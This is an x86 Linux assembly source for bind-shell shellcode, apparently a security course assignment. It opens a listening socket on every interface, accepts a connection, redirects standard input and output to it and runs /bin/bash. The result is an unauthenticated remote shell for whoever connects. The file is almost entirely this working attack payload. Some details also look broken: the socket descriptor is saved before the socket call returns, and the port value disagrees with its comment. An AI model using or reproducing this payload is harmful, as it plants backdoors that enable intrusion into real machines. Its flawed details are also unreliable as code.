;Bind shell x86/linux	
;Author : Tripster

;Heavily referred to https://mrpapercut.com/blog/2018-06-03-slae-assignment-1
;#define SYS_SOCKET  1   /* sys_socket(2)    */ 
;#define SYS_BIND    2   /* sys_bind(2)  */ 
;#define SYS_LISTEN  4   /* sys_listen(2)    */ 
;#define SYS_ACCEPT  5   /* sys_accept(2)    */ 


;int socketcall(int call, unsigned long *args);

section .TEXT
global _start

_start:
	;socket(PF_INET, SOCK_STREAM, 0)
	xor eax,eax
	push eax 
	mov al,102                                        ;socket_syscall
	mov bl,0x01                                       ;socket()
	push byte 0x1					  ;Sock_Stream
	push byte 0x2					  ;PF_INET
	mov ecx,esp			                  ;pointer to  second argument for socket arguments
	mov esi,eax					  ;store result returned sockfd for later use
	int 0x80



	;bind(sockfd, (struct sockaddr*) &hostaddr, sizeof(hostaddr))
	;setup struct for bind() argument 
	;hostaddr.sin_family = AF_INET; 
	;hostaddr.sin_port = htons(7737); 
	;hostaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
	xor eax,eax	
	push eax				          ;push 0.0.0.0
	push word 0x1cd1                                  ;push port number 
	push word 0x2                                     ;AF_INET
	mov ecx,esp					  ;mov structure reference
	push 0x10					  ;push sizeof addr	
	push ecx				          ;push address of pointer for the strucuture
	push esi					  ;sockfd
	mov ecx,esp
	xor eax,eax
	mov al,102
	xor ebx,ebx
	mov bl,0x02
	int 0x80

	;listen(socketfd, 2)
	xor eax,eax
	mov al,102
	xor ebx,ebx
	mov bl,4                                          ;listen syscall
	push byte 0x02				          ;push 0x02
	push esi				          ;push sockfd
	mov ecx,esp		                          ;address of arguments
	int 0x80



	;socketid = accept(socketfd, null, null) 


	xor eax,eax
	xor ebx,ebx	
	mov al,102
	mov bl,5 
	xor edx,edx
	push edx                                          ;null	
	push edx					  ;null
	push esi					  ;socketfd
	mov ecx,esp
	int 0x80


	;Socketcalls done, now we do normal sytemcall
	;dup2(socketid, 0/1/2)
	
	mov ebx, eax  					;Reference to socketid 
        xor eax, eax 					 
	mov al, 0x3f 					; SYS_DUP2 
	xor ecx, ecx  					; 0 
	int 0x80 	
	 
        xor eax, eax 					 
	mov al, 0x3f 					; SYS_DUP2 
	inc ecx  					; 1
	int 0x80  	

        xor eax, eax 					 
	mov al, 0x3f 					; SYS_DUP2 
	inc ecx  					; 1
	int 0x80 		




	;execve("////bin/bash", NULL, NULL)
	xor eax, eax 					; Clear EAX 
	mov al, 0x0b 					; SYS_EXECVE 
	push edx ; 					;Push NULL character to stack (EDX is still NULL) 
	push 0x68736162 				; "hsab" 
	push 0x2f6e6962 				; "/nib" 
	push 0x2f2f2f2f 				; "////" 
	mov ebx, esp 					; Reference to "////bin/bash" on stack 
	xor ecx, ecx 					; 2nd argument NULL 
	int 0x80 					; Exec syscall  	
					
